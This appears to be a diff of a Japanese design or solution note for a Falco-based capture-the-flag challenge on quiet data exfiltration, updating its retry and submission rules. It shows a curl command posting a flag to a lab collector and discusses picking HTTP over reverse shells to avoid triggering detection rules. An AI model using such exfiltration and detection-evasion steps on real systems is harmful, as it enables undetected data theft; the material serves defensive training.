@@ -9,7 +9,8 @@ submit するだけでは通らない(`requireExfil`)。
 1. `submit` の flag が `expectedFlag` と一致
 2. この attempt (このミッションが現在の課題になって以降) に `forbiddenRules`
    (7 つ) が 1 つも発火していない (時間では解除されない。発火した場合は
-   `reset-dirty` でやり直す — その際 exfil 済みの証跡も無効化される)
+   Journey 画面の「このミッションをやり直す」ボタンでやり直す —
+   その際 exfil 済みの証跡も無効化されるので、やり直した後は再度 exfil が必要)
 3. その user が collector に正しい flag を exfil 済み
    (`POST /api/challenges/10-final-exfil/exfil`、`requireExfil: true`)
 
@@ -47,7 +48,7 @@ curl -s "${FALCO_CTF_COLLECTOR}/api/challenges/10-final-exfil/exfil" \
   -d "{\"user\":\"${FALCO_CTF_USER}\",\"flag\":\"${FLAG}\"}"
 #  → {"received":true,...}
 
-# 3) 30 秒静かに待ってから提出
+# 3) そのまま提出 (禁止ルールを一度も発火させていなければ solve)
 source /opt/ctf/submit.sh
 submit 10-final-exfil "${FLAG}"
 ```
@@ -60,7 +61,9 @@ submit 10-final-exfil "${FLAG}"
   「派手な持ち出し = 発火」という 07/08 の教訓が初めて要求される。
 - collector が HTTP 受信専用なのは意図的: reverse shell では届かないので、
   curl(既存バイナリ・dup を伴わない HTTP)に自然に誘導される。
-- window 検査は二重の安全網: もし reverse shell や drop+exec を試して
-  発火させると、その後 30 秒は submit が `evaded:false` で弾かれる。
+- 禁止ルールの検査は二重の安全網: もし reverse shell や drop+exec を試して
+  発火させると、この attempt はやり直すまで `evaded:false` で弾かれ続ける
+  (時間では解除されない)。やり直すと exfil の証跡も消えるので、
+  再挑戦する際は (2) からやり直す必要がある。
 - 講評: 防御側は「検知点を増やす」だけでなく「攻撃者が必ず通る隘路
   (= 持ち出し)」に検知を置くほど、攻撃コストが跳ね上がる。
